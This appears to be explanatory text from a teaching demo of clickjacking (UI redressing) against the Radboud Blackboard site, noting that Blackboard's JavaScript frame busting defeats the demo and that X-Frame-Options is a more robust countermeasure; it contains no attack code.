  A fancier example of clickjacking, where we use UI redressing
  to steal a button from the Blackboard website.
  For the demo, log in to <a href="http://blackboard.ru.nl">Blackboard</a> first.

  <p>

  Unfortunately, this only works with JavaScript turned off,
  otherwise BlackBoard takes over the whole browser window.
  Apparently the Blackboard website uses JavaScript for
  frame busting, as countermeasure to UI redressing attacks.
  To see this frame busting in action, simply open this webpage
  with JavaScript enabled.
  Note that (also) using XFrame options would be a more
  robust countermeasure against UI redressing attacks.
